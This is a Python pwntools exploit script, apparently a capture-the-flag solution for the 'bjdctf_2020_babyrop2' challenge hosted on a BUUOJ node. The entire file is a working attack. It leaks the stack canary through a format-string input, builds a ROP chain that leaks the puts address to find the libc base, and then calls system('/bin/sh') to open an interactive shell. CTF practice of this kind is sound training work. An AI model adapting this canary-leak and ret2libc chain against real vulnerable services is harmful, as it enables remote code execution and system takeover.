from pwn import *

context.log_level = 'debug'
# io = process('bjdctf_2020_babyrop2')
io = remote('node4.buuoj.cn', 27404)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.so')
elf = ELF('bjdctf_2020_babyrop2')
vuln = elf.symbols['vuln']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
pop_rdi_ret = 0x400993 

io.sendlineafter('I\'ll give u some gift to help u!\n', '%7$p')
canary = int(io.recvn(18), 16)
payload = cyclic(0x18) + p64(canary) + cyclic(8) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln)
io.sendlineafter('Pull up your sword and tell me u story!\n', payload)
libc_base = u64(io.recvn(6).ljust(8, b'\x00')) - libc.symbols['puts']
log.success('libc_base: ' + hex(libc_base))

system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))
payload = cyclic(0x18) + p64(canary) + cyclic(8) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)
io.sendlineafter('Pull up your sword and tell me u story!\n', payload)
io.interactive()

